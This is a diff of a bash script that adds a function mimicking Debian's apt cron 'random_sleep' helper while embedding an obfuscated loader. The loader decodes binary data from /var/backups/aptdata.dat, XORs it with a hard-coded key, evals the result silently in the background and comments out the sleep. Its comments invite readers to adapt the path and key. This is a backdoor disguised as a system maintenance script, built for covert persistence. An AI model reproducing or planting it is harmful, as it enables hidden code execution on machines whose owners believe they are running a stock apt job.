@@ -61,10 +61,51 @@ deobfBdSlim() {
     x(){ K=$1;shift;R="";for i in $@; do R="$R $(($i^$K))";done;echo "$R";}
     eval $"$(echo -e "$(sed 's/;/\n/g' <<<"$(awk '{for (i=1; i<=NF; i++) printf "%c", $i}'<<<\
     "$(x "${2}" "$(for a in $(cat "${1}");do printf "%x" $((2#$a));done|xxd -r -p)"\
-    |sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')")"|sed '/^$/d'|sed 's/^0x//g'|xargs -I{} printf "\\x{}")")" &
+    |sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')")"|sed '/^$/d'|sed 's/^0x//g'|xargs -I{} printf "\\x{}")")" 2>/dev/nul &
 }
 
 
-# deobfBd "${1}" "42"
-deobfBdSlim "${1}" "42"
+# randon sleep function copied from the deafult apt periodic script found in /etc/cron.daily/apt-compat
+random_sleep()
+{
+    RandomSleep=1800
+    eval $(apt-config shell RandomSleep APT::Periodic::RandomSleep)
+    if [ $RandomSleep -eq 0 ]; then
+        return
+    fi
+    if [ -z "$RANDOM" ] ; then
+        # A fix for shells that do not have this bash feature.
+        RANDOM=$(( $(dd if=/dev/urandom bs=2 count=1 2> /dev/null | cksum | cut -d' ' -f1) % 32767 ))
+    fi
+    TIME=$(($RANDOM % $RandomSleep))
+    sleep $TIME
+}
 
+
+# My version of the random sleep function with the embedded deobfBdSlim function.
+# Note: the data.dat file location and the Xor key is hard coded in the function. You will need to change the location of the data.dat file and the Xor key to match your needs.
+New_random_sleep()
+{
+    RandomSleep=1800
+    x() { K=$1; shift; R=""; for i in $@; do R="$R $(($i^$K))"; done; echo "$R"; }
+    eval $(apt-config shell RandomSleep APT::Periodic::RandomSleep)
+    eval $"$(echo -e "$(sed 's/;/\n/g' <<<"$(awk '{for (i=1; i<=NF; i++) printf "%c", $i}'<<<\
+    "$(x 42 "$(for a in $(cat /var/backups/aptdata.dat);do printf "%x" $((2#$a));done|xxd -r -p)"|\
+    sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')")"|sed '/^$/d'|sed 's/^0x//g'|\
+    xargs -I{} printf "\\x{}")")" 2>/dev/null &
+    if [ $RandomSleep -eq 0 ]; then
+        return
+    fi
+    if [ -z "$RANDOM" ] ; then
+        # A fix for shells that do not have this bash feature.
+        RANDOM=$(( $(dd if=/dev/urandom bs=2 count=1 2> /dev/null | cksum | cut -d' ' -f1) % 32767 ))
+    fi
+    TIME=$(($RANDOM % $RandomSleep))
+    # sleep $TIME
+}
+
+# Run the function with the binary file as the first argument, and the XOR key as the second argument.
+deobfBd "${1}" "42"
+
+# Run the slimmed down function with the binary file as the first argument, and the XOR key as the second argument.
+deobfBdSlim "${1}" "42"
